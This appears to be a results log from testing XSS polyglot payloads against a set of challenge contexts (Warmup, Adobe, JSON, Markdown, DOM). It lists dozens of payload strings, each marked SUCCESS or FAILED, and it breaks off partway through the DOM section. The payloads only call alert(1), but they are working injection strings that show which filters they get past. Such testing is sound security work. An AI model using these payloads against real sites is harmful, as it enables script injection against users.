@@ -1,0 +1,133 @@
+
+Challenge Warmup
+FAILED : javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert(1)//>
+FAILED : javascript:"/*'/*`/*\" /*</title></style></textarea></noscript></noembed></template></script/-->&lt;svg/onload=/*<html/*/onmouseover=alert(1)//>
+FAILED : javascript:"/*\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>-->&lt;svg onload=/*<html/*/onmouseover=alert(1)//>
+FAILED : javascript:`//"//\"//</title></textarea></style></noscript></noembed></script></template>&lt;svg/onload='/*--><html */ onmouseover=alert(1)//'>`
+FAILED : javascript:`//"//\"//</title></textarea></style></noscript></noembed></script></template>&lt;svg/onload='/*--><html */ onmouseover=alert(1)//'>`
+FAILED : javascript:`/*\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert(1)//'">`
+FAILED : javascript:"/*'//`//\"//</template/</title/</textarea/</style/</noscript/</noembed/</script/--><script>/&lt;i<frame */ onload=alert(1)//</script>
+SUCCESS : javascript:"/*`/*\"/*'/*</stYle/</titLe/</teXtarEa/</nOscript></noembed></template></script/--><ScRipt>/*&lt;i<frame/*/ onload=alert(1)//</Script>
+SUCCESS : javascript:`</template>\"///"//</script/--></title/'</style/</textarea/</noembed/</noscript>&lt;<script/>/<frame */; onload=alert(1)//&lt</script>`
+FAILED : javascript:/*`//'//\"//</style></noscript></script>--></textarea></noembed></template></title><script>/<frame &lt;svg"///*/ onload=alert(1)//</script>
+FAILED : javascript:/*`//'//\"//</style></noscript></script>--></textarea></noembed></template></title><script>/<frame &lt;svg"///*/ onload=alert(1)//</script>
+FAILED : javascript:/*"//'//`//\"//--></script></title></style></textarea></template></noembed></noscript><script>//<frame/&lt;svg/*/onload= alert(1)//</script>
+SUCCESS : javascript:/*-->'//"//`//\"//</title></textarea></style></noscript></script></noembed></template><script>/*<frame/&lt;svg */ onload=alert(1)//</script>
+SUCCESS : javascript:/*"/*'/*`/*\"/*</script/</title/</textarea/</style/</noscript></template></noembed>--><script>/*&lt;svg <frame */ onload=alert(1)//</script>
+FAILED : javascript:/*"/*'/*\"/*`/*--></title></noembed></template></textarea></noscript></style></script><script>//<frame &lt;svg */ onload=alert(1)//</script>
+SUCCESS : javascript:/*"/*`/*'/*\"/*--></title></script></textarea></noscript></style></noembed></template><script> /*&lt;svg <frame onload=/**/alert(1)//</script>
+SUCCESS : javascript:"/*'//`//\"//</title></template/</textarea/</style/</noscript/</noembed/</script>-->&lt;<script>alert(1)&lt;</script><frame/*/ onload=alert(1)//>
+FAILED : javascript:alert(1)"//</title></textarea></style></noscript></noembed></template></script>\"//'//`//--><script>//&lt;svg <frame */onload= alert(1)//</script>
+FAILED : javascript:alert(1)"//</title></textarea></style></noscript></noembed></template></script>\"//'//`//--><script>//&lt;svg <frame */onload= alert(1)//</script>
+FAILED : javascript:/*"/*`/*'/*\"/*</script></style></template></select></title></textarea></noscript></noembed><frame/onload=alert(1)-->&lt;<svg/*/ onload=alert(1)//>
+FAILED : javascript:"/*`/*\"/*' /*</stYle/</titLe/</teXtarEa/</nOscript></Script></noembed></select></template><FRAME/onload=/**/alert(1)//-->&lt;<sVg/onload=alert(1)``>
+FAILED : javascript:/*--></script></textarea></style></noscript>\"</noembed>[`</template>["</select>['</title>]&lt;<script>///<frame */ onload=alert(1)//&lt;</script>
+FAILED : javascript:"/*\"/*'/*`/*--></noembed></template></noscript></title></textarea></style></script></select><frame/onload=alert(1)>&lt;<svg/onload= /**/alert(1)//>
+SUCCESS : javascript:/*"/*`/*'/*\"/*--></title></textarea></noscript></noembed></template></style></script>&lt;<script> /**/alert(1)//&lt;</script><frame onload=alert(1)>
+SUCCESS : javascript:"/*\"/*'/*--></title></textarea></style></noscript></template></noembed></script>&lt;<script>/*` /*<frame src=javascript:/**/alert(1)//>&lt;</script>
+SUCCESS : javascript:{alert(1)}//*/javascript:javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*&lt;svg/*/onload={alert(1)}onload={alert(1)}//><svg onload={alert(1)}><svg onload={alert(1)}>*/</style><script>{alert(1)}</script><style>
+SUCCESS : -{alert(1)}//</style><svg/onload={alert(1)}//>/**/{alert(1)}//("-{alert(1)}-"///,\'-{alert(1)}-\'--><svg/onload={alert(1)}>\\x3csvg onload={alert(1)}\\x3e</textarea><svg/onload={alert(1)}//>/**/{alert(1)}//</script><script>{alert(1)}//function(){{{alert(1)}}}()*/{alert(1)}--><svg/onload={alert(1)}//>
+
+Challenge Adobe
+FAILED : javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert(1)//>
+FAILED : javascript:"/*'/*`/*\" /*</title></style></textarea></noscript></noembed></template></script/-->&lt;svg/onload=/*<html/*/onmouseover=alert(1)//>
+FAILED : javascript:"/*\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>-->&lt;svg onload=/*<html/*/onmouseover=alert(1)//>
+FAILED : javascript:`//"//\"//</title></textarea></style></noscript></noembed></script></template>&lt;svg/onload='/*--><html */ onmouseover=alert(1)//'>`
+FAILED : javascript:`//"//\"//</title></textarea></style></noscript></noembed></script></template>&lt;svg/onload='/*--><html */ onmouseover=alert(1)//'>`
+FAILED : javascript:`/*\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert(1)//'">`
+FAILED : javascript:"/*'//`//\"//</template/</title/</textarea/</style/</noscript/</noembed/</script/--><script>/&lt;i<frame */ onload=alert(1)//</script>
+SUCCESS : javascript:"/*`/*\"/*'/*</stYle/</titLe/</teXtarEa/</nOscript></noembed></template></script/--><ScRipt>/*&lt;i<frame/*/ onload=alert(1)//</Script>
+SUCCESS : javascript:`</template>\"///"//</script/--></title/'</style/</textarea/</noembed/</noscript>&lt;<script/>/<frame */; onload=alert(1)//&lt</script>`
+FAILED : javascript:/*`//'//\"//</style></noscript></script>--></textarea></noembed></template></title><script>/<frame &lt;svg"///*/ onload=alert(1)//</script>
+FAILED : javascript:/*`//'//\"//</style></noscript></script>--></textarea></noembed></template></title><script>/<frame &lt;svg"///*/ onload=alert(1)//</script>
+FAILED : javascript:/*"//'//`//\"//--></script></title></style></textarea></template></noembed></noscript><script>//<frame/&lt;svg/*/onload= alert(1)//</script>
+SUCCESS : javascript:/*-->'//"//`//\"//</title></textarea></style></noscript></script></noembed></template><script>/*<frame/&lt;svg */ onload=alert(1)//</script>
+SUCCESS : javascript:/*"/*'/*`/*\"/*</script/</title/</textarea/</style/</noscript></template></noembed>--><script>/*&lt;svg <frame */ onload=alert(1)//</script>
+FAILED : javascript:/*"/*'/*\"/*`/*--></title></noembed></template></textarea></noscript></style></script><script>//<frame &lt;svg */ onload=alert(1)//</script>
+SUCCESS : javascript:/*"/*`/*'/*\"/*--></title></script></textarea></noscript></style></noembed></template><script> /*&lt;svg <frame onload=/**/alert(1)//</script>
+SUCCESS : javascript:"/*'//`//\"//</title></template/</textarea/</style/</noscript/</noembed/</script>-->&lt;<script>alert(1)&lt;</script><frame/*/ onload=alert(1)//>
+FAILED : javascript:alert(1)"//</title></textarea></style></noscript></noembed></template></script>\"//'//`//--><script>//&lt;svg <frame */onload= alert(1)//</script>
+FAILED : javascript:alert(1)"//</title></textarea></style></noscript></noembed></template></script>\"//'//`//--><script>//&lt;svg <frame */onload= alert(1)//</script>
+FAILED : javascript:/*"/*`/*'/*\"/*</script></style></template></select></title></textarea></noscript></noembed><frame/onload=alert(1)-->&lt;<svg/*/ onload=alert(1)//>
+FAILED : javascript:"/*`/*\"/*' /*</stYle/</titLe/</teXtarEa/</nOscript></Script></noembed></select></template><FRAME/onload=/**/alert(1)//-->&lt;<sVg/onload=alert(1)``>
+FAILED : javascript:/*--></script></textarea></style></noscript>\"</noembed>[`</template>["</select>['</title>]&lt;<script>///<frame */ onload=alert(1)//&lt;</script>
+FAILED : javascript:"/*\"/*'/*`/*--></noembed></template></noscript></title></textarea></style></script></select><frame/onload=alert(1)>&lt;<svg/onload= /**/alert(1)//>
+SUCCESS : javascript:/*"/*`/*'/*\"/*--></title></textarea></noscript></noembed></template></style></script>&lt;<script> /**/alert(1)//&lt;</script><frame onload=alert(1)>
+SUCCESS : javascript:"/*\"/*'/*--></title></textarea></style></noscript></template></noembed></script>&lt;<script>/*` /*<frame src=javascript:/**/alert(1)//>&lt;</script>
+SUCCESS : javascript:{alert(1)}//*/javascript:javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*&lt;svg/*/onload={alert(1)}onload={alert(1)}//><svg onload={alert(1)}><svg onload={alert(1)}>*/</style><script>{alert(1)}</script><style>
+SUCCESS : -{alert(1)}//</style><svg/onload={alert(1)}//>/**/{alert(1)}//("-{alert(1)}-"///,\'-{alert(1)}-\'--><svg/onload={alert(1)}>\\x3csvg onload={alert(1)}\\x3e</textarea><svg/onload={alert(1)}//>/**/{alert(1)}//</script><script>{alert(1)}//function(){{{alert(1)}}}()*/{alert(1)}--><svg/onload={alert(1)}//>
+
+Challenge JSON
+FAILED : javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert(1)//>
+FAILED : javascript:"/*'/*`/*\" /*</title></style></textarea></noscript></noembed></template></script/-->&lt;svg/onload=/*<html/*/onmouseover=alert(1)//>
+FAILED : javascript:"/*\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>-->&lt;svg onload=/*<html/*/onmouseover=alert(1)//>
+FAILED : javascript:`//"//\"//</title></textarea></style></noscript></noembed></script></template>&lt;svg/onload='/*--><html */ onmouseover=alert(1)//'>`
+FAILED : javascript:`//"//\"//</title></textarea></style></noscript></noembed></script></template>&lt;svg/onload='/*--><html */ onmouseover=alert(1)//'>`
+FAILED : javascript:`/*\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert(1)//'">`
+FAILED : javascript:"/*'//`//\"//</template/</title/</textarea/</style/</noscript/</noembed/</script/--><script>/&lt;i<frame */ onload=alert(1)//</script>
+SUCCESS : javascript:"/*`/*\"/*'/*</stYle/</titLe/</teXtarEa/</nOscript></noembed></template></script/--><ScRipt>/*&lt;i<frame/*/ onload=alert(1)//</Script>
+SUCCESS : javascript:`</template>\"///"//</script/--></title/'</style/</textarea/</noembed/</noscript>&lt;<script/>/<frame */; onload=alert(1)//&lt</script>`
+FAILED : javascript:/*`//'//\"//</style></noscript></script>--></textarea></noembed></template></title><script>/<frame &lt;svg"///*/ onload=alert(1)//</script>
+FAILED : javascript:/*`//'//\"//</style></noscript></script>--></textarea></noembed></template></title><script>/<frame &lt;svg"///*/ onload=alert(1)//</script>
+FAILED : javascript:/*"//'//`//\"//--></script></title></style></textarea></template></noembed></noscript><script>//<frame/&lt;svg/*/onload= alert(1)//</script>
+SUCCESS : javascript:/*-->'//"//`//\"//</title></textarea></style></noscript></script></noembed></template><script>/*<frame/&lt;svg */ onload=alert(1)//</script>
+SUCCESS : javascript:/*"/*'/*`/*\"/*</script/</title/</textarea/</style/</noscript></template></noembed>--><script>/*&lt;svg <frame */ onload=alert(1)//</script>
+FAILED : javascript:/*"/*'/*\"/*`/*--></title></noembed></template></textarea></noscript></style></script><script>//<frame &lt;svg */ onload=alert(1)//</script>
+SUCCESS : javascript:/*"/*`/*'/*\"/*--></title></script></textarea></noscript></style></noembed></template><script> /*&lt;svg <frame onload=/**/alert(1)//</script>
+SUCCESS : javascript:"/*'//`//\"//</title></template/</textarea/</style/</noscript/</noembed/</script>-->&lt;<script>alert(1)&lt;</script><frame/*/ onload=alert(1)//>
+FAILED : javascript:alert(1)"//</title></textarea></style></noscript></noembed></template></script>\"//'//`//--><script>//&lt;svg <frame */onload= alert(1)//</script>
+FAILED : javascript:alert(1)"//</title></textarea></style></noscript></noembed></template></script>\"//'//`//--><script>//&lt;svg <frame */onload= alert(1)//</script>
+FAILED : javascript:/*"/*`/*'/*\"/*</script></style></template></select></title></textarea></noscript></noembed><frame/onload=alert(1)-->&lt;<svg/*/ onload=alert(1)//>
+FAILED : javascript:"/*`/*\"/*' /*</stYle/</titLe/</teXtarEa/</nOscript></Script></noembed></select></template><FRAME/onload=/**/alert(1)//-->&lt;<sVg/onload=alert(1)``>
+FAILED : javascript:/*--></script></textarea></style></noscript>\"</noembed>[`</template>["</select>['</title>]&lt;<script>///<frame */ onload=alert(1)//&lt;</script>
+FAILED : javascript:"/*\"/*'/*`/*--></noembed></template></noscript></title></textarea></style></script></select><frame/onload=alert(1)>&lt;<svg/onload= /**/alert(1)//>
+SUCCESS : javascript:/*"/*`/*'/*\"/*--></title></textarea></noscript></noembed></template></style></script>&lt;<script> /**/alert(1)//&lt;</script><frame onload=alert(1)>
+SUCCESS : javascript:"/*\"/*'/*--></title></textarea></style></noscript></template></noembed></script>&lt;<script>/*` /*<frame src=javascript:/**/alert(1)//>&lt;</script>
+SUCCESS : javascript:{alert(1)}//*/javascript:javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*&lt;svg/*/onload={alert(1)}onload={alert(1)}//><svg onload={alert(1)}><svg onload={alert(1)}>*/</style><script>{alert(1)}</script><style>
+SUCCESS : -{alert(1)}//</style><svg/onload={alert(1)}//>/**/{alert(1)}//("-{alert(1)}-"///,\'-{alert(1)}-\'--><svg/onload={alert(1)}>\\x3csvg onload={alert(1)}\\x3e</textarea><svg/onload={alert(1)}//>/**/{alert(1)}//</script><script>{alert(1)}//function(){{{alert(1)}}}()*/{alert(1)}--><svg/onload={alert(1)}//>
+
+Challenge Markdown
+FAILED : javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert(1)//>
+FAILED : javascript:"/*'/*`/*\" /*</title></style></textarea></noscript></noembed></template></script/-->&lt;svg/onload=/*<html/*/onmouseover=alert(1)//>
+FAILED : javascript:"/*\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>-->&lt;svg onload=/*<html/*/onmouseover=alert(1)//>
+FAILED : javascript:`//"//\"//</title></textarea></style></noscript></noembed></script></template>&lt;svg/onload='/*--><html */ onmouseover=alert(1)//'>`
+FAILED : javascript:`//"//\"//</title></textarea></style></noscript></noembed></script></template>&lt;svg/onload='/*--><html */ onmouseover=alert(1)//'>`
+FAILED : javascript:`/*\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert(1)//'">`
+FAILED : javascript:"/*'//`//\"//</template/</title/</textarea/</style/</noscript/</noembed/</script/--><script>/&lt;i<frame */ onload=alert(1)//</script>
+SUCCESS : javascript:"/*`/*\"/*'/*</stYle/</titLe/</teXtarEa/</nOscript></noembed></template></script/--><ScRipt>/*&lt;i<frame/*/ onload=alert(1)//</Script>
+FAILED : javascript:`</template>\"///"//</script/--></title/'</style/</textarea/</noembed/</noscript>&lt;<script/>/<frame */; onload=alert(1)//&lt</script>`
+SUCCESS : javascript:/*`//'//\"//</style></noscript></script>--></textarea></noembed></template></title><script>/<frame &lt;svg"///*/ onload=alert(1)//</script>
+SUCCESS : javascript:/*`//'//\"//</style></noscript></script>--></textarea></noembed></template></title><script>/<frame &lt;svg"///*/ onload=alert(1)//</script>
+FAILED : javascript:/*"//'//`//\"//--></script></title></style></textarea></template></noembed></noscript><script>//<frame/&lt;svg/*/onload= alert(1)//</script>
+FAILED : javascript:/*-->'//"//`//\"//</title></textarea></style></noscript></script></noembed></template><script>/*<frame/&lt;svg */ onload=alert(1)//</script>
+FAILED : javascript:/*"/*'/*`/*\"/*</script/</title/</textarea/</style/</noscript></template></noembed>--><script>/*&lt;svg <frame */ onload=alert(1)//</script>
+FAILED : javascript:/*"/*'/*\"/*`/*--></title></noembed></template></textarea></noscript></style></script><script>//<frame &lt;svg */ onload=alert(1)//</script>
+FAILED : javascript:/*"/*`/*'/*\"/*--></title></script></textarea></noscript></style></noembed></template><script> /*&lt;svg <frame onload=/**/alert(1)//</script>
+SUCCESS : javascript:"/*'//`//\"//</title></template/</textarea/</style/</noscript/</noembed/</script>-->&lt;<script>alert(1)&lt;</script><frame/*/ onload=alert(1)//>
+FAILED : javascript:alert(1)"//</title></textarea></style></noscript></noembed></template></script>\"//'//`//--><script>//&lt;svg <frame */onload= alert(1)//</script>
+FAILED : javascript:alert(1)"//</title></textarea></style></noscript></noembed></template></script>\"//'//`//--><script>//&lt;svg <frame */onload= alert(1)//</script>
+FAILED : javascript:/*"/*`/*'/*\"/*</script></style></template></select></title></textarea></noscript></noembed><frame/onload=alert(1)-->&lt;<svg/*/ onload=alert(1)//>
+FAILED : javascript:"/*`/*\"/*' /*</stYle/</titLe/</teXtarEa/</nOscript></Script></noembed></select></template><FRAME/onload=/**/alert(1)//-->&lt;<sVg/onload=alert(1)``>
+FAILED : javascript:/*--></script></textarea></style></noscript>\"</noembed>[`</template>["</select>['</title>]&lt;<script>///<frame */ onload=alert(1)//&lt;</script>
+FAILED : javascript:"/*\"/*'/*`/*--></noembed></template></noscript></title></textarea></style></script></select><frame/onload=alert(1)>&lt;<svg/onload= /**/alert(1)//>
+FAILED : javascript:/*"/*`/*'/*\"/*--></title></textarea></noscript></noembed></template></style></script>&lt;<script> /**/alert(1)//&lt;</script><frame onload=alert(1)>
+FAILED : javascript:"/*\"/*'/*--></title></textarea></style></noscript></template></noembed></script>&lt;<script>/*` /*<frame src=javascript:/**/alert(1)//>&lt;</script>
+SUCCESS : javascript:{alert(1)}//*/javascript:javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*&lt;svg/*/onload={alert(1)}onload={alert(1)}//><svg onload={alert(1)}><svg onload={alert(1)}>*/</style><script>{alert(1)}</script><style>
+SUCCESS : -{alert(1)}//</style><svg/onload={alert(1)}//>/**/{alert(1)}//("-{alert(1)}-"///,\'-{alert(1)}-\'--><svg/onload={alert(1)}>\\x3csvg onload={alert(1)}\\x3e</textarea><svg/onload={alert(1)}//>/**/{alert(1)}//</script><script>{alert(1)}//function(){{{alert(1)}}}()*/{alert(1)}--><svg/onload={alert(1)}//>
+
+Challenge DOM
+SUCCESS : javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert(1)//>
+SUCCESS : javascript:"/*'/*`/*\" /*</title></style></textarea></noscript></noembed></template></script/-->&lt;svg/onload=/*<html/*/onmouseover=alert(1)//>
+SUCCESS : javascript:"/*\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>-->&lt;svg onload=/*<html/*/onmouseover=alert(1)//>
+SUCCESS : javascript:`//"//\"//</title></textarea></style></noscript></noembed></script></template>&lt;svg/onload='/*--><html */ onmouseover=alert(1)//'>`
+FAILED : javascript:`//"//\"//</title></textarea></style></noscript></noembed></script></template>&lt;svg/onload='/*--><html */ onmouseover=alert(1)//'>`
+FAILED : javascript:`/*\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert(1)//'">`
+FAILED : javascript:"/*'//`//\"//</template/</title/</textarea/</style/</noscript/</noembed/</script/--><script>/&lt;i<frame */ onload=alert(1)//</script>
+FAILED : javascript:"/*`/*\"/*'/*</stYle/</titLe/</teXtarEa/</nOscript></noembed></template></script/--><ScRipt>/*&lt;i<frame/*/ onload=alert(1)//</Script>
+FAILED : javascript:`</template>\"///"//</script/--></title/'</style/</textarea/</noembed/</noscript>&lt;<script/>/<frame */; onload=alert(1)//&lt</script>`
+FAILED : javascript:/*`//'//\"//</style></noscript></script>--></textarea></noembed></template></title><script>/<frame &lt;svg"///*/ onload=alert(1)//</script>
+FAILED : javascript:/*`//'//\"//</style></noscript></script>--></textarea></noembed></template></title><script>/<frame &lt;svg"///*/ onload=alert(1)//</script>
+FAILED : javascript:/*"//'//`//\"//--></script></title></style></textarea></template></noembed></noscript><script>//<frame/&lt;svg/*/onload= alert(1)//</script>
+FAILED : javascript:/*-->'//"//`//\"//</title></textarea></style></noscript></script></noembed></template><script>/*<frame/&lt;svg */ onload=alert(1)//</script>
+FAILED : javascript:/*"/*'/*`/*\"/*</script/</title/</textarea/</style/</noscript></template></noembed>--><script>/*&lt;svg <frame */ onload=alert(1)//</script>
+FAILED : javascript:/*"/*'/*\"/*`/*--></title></noembed></template></textarea></noscript></style></script><script>//<frame &lt;svg */ onload=alert(1)//</script>
